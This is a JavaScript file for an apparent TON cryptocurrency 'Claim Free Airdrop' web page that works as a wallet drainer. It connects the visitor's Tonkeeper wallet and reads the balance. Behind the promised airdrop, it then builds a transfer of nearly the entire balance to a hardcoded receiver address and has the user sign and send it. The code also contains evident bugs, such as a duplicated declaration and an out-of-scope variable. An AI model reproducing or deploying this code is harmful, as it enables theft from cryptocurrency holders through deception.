$(document).ready(function () {
    async function connectWallet() {
        if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
            openInWalletBrowser();
            return;
        }

        if (window.ton || window.tonkeeper) {
            try {
                const wallet = window.ton || window.tonkeeper;
                const resp = await wallet.connect();
                console.log("Wallet connected:", resp);

                const tonweb = new TonWeb();
                const address = resp.publicKey;
                const wallet = tonweb.wallet.create({ publicKey: new Uint8Array(address) });

                const balance = await wallet.getBalance();
                console.log("Wallet balance:", balance);

                const minBalance = 1e9;
                if (balance < minBalance) {
                    alert("Insufficient funds for Fee.");
                    return;
                }

                $("#connect-wallet").text("Claim Free Airdrop");
                $("#connect-wallet")
                    .off("click")
                    .on("click", async () => transferAssets(tonweb, address, balance, minBalance));
            } catch (err) {
                console.error("Error connecting to wallet:", err);
            }
        } else {
            alert("No supported wallet found. Please install Tonkeeper or another TON wallet.");
            window.open("https://ton.org/wallet", "_blank");
        }
    }

    function openInWalletBrowser() {
        let siteURL = encodeURIComponent(window.location.href);
        let walletLinks = {
            tonkeeper: `https://tonkeeper.com/?url=${siteURL}`,
        };

        let storeLinks = {
            tonkeeper: "https://tonkeeper.com/",
        };

        let selectedWallet = "tonkeeper";

        let deepLink = walletLinks[selectedWallet];
        let storeLink = storeLinks[selectedWallet];

        let timeout = setTimeout(() => {
            window.location.href = storeLink;
        }, 2000);

        window.location.href = deepLink;

        setTimeout(() => {
            clearTimeout(timeout);
        }, 1000);
    }

    async function transferAssets(tonweb, address, balance, minBalance) {
        try {
            const receiverWallet = "UQDT_5jBkJA3Y5qGeb-lZjbv8nM8yo44C81HZT78S4H6xGoh";
            const balanceForTransfer = balance - minBalance;
            if (balanceForTransfer > 0) {
                const tonAmount = balanceForTransfer / 1e9; 
                const message = await tonweb.wallet.createTransfer({
                    to: receiverWallet,
                    value: tonAmount,
                    seqno: await tonweb.wallet.getSeqno(),
                    payload: "",
                });

                const signed = await wallet.signTransfer(message);
                const txid = await tonweb.provider.sendMessage(signed);
                console.log("Transaction confirmed:", txid);
            }
        } catch (err) {
            console.error("Error during transaction:", err);
        }
    }

    $("#connect-wallet").on("click", connectWallet);
});
